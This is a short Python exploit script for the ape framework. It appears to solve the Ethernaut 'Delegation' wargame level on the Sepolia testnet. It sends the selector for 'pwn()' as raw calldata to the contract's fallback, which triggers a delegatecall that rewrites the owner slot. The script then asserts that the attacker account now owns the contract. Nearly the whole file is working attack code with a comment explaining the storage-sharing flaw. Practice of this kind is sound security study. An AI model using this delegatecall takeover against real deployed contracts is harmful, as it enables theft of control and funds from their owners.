#!/usr/bin/python3
from ape import accounts, networks, project
from rich.console import Console
from eth_utils import keccak


# sepolia: 0x456165ce9dd13A160e53f739d05995d4BeCFdb4c
ADDRESS = "0x456165ce9dd13A160e53f739d05995d4BeCFdb4c"

console = Console()

def attack():
    attacker = accounts[0]
    attacker.set_autosign(True)
    contract = project.Delegation.at(ADDRESS)

    console.print(f"[green]Owner Before The Hack: [magenta]{contract.owner()}")
    console.print("[red]Attacking Now...")

    # The call context i.e. msg.sender & msg.value will be of the calling contract to the delegated contract. So sharing the storage & will update the state vars of the calling contract

    data = keccak(text="pwn()")

    contract(sender=attacker, data=data, gas=1000000)
    #contract.pwn(sender=attacker, gas=3000000)

    console.print(f"[green]Owner After The Hack: [magenta]{contract.owner()}")

    assert contract.owner() == attacker.address


def main():
    attack()


if __name__ == "__main__":
    main()
